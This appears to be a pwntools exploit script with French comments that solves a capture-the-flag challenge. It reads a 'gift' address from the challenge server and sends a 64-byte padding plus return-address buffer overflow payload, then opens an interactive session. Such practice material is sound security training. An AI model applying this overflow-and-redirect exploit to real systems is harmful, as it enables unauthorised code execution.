from pwn import *

# Adresse du serveur et du port
host = 'challenges.hackademint.org'
port = 31037

# Se connecter au serveur
conn = remote(host, port)

# Recevoir le message initial
initial_message = conn.recvline().decode().strip()
print(initial_message)

# Envoyer une demande d'adresse de cadeau
conn.sendline(b'get_gift_address')

# Recevoir et extraire l'adresse du cadeau du serveur
gift_address_line = conn.recvline().decode().strip()
gift_address_prefix = 'Cadeau : 0x'
if not gift_address_line.startswith(gift_address_prefix):
    print("Erreur: Adresse du cadeau non trouvée.")
    conn.close()
else:
    gift_address = int(gift_address_line[len(gift_address_prefix):], 16)
    print(f"Adresse du cadeau : {hex(gift_address)}")

    # Construire la charge utile
    payload = b'A' * 64 + p64(gift_address)

    # Envoyer la charge utile
    conn.sendline(payload)

    # Recevoir et afficher la réponse du serveur
    response = conn.recvall().decode()
    print(response)

    # Fermer la connexion
    conn.interactive()
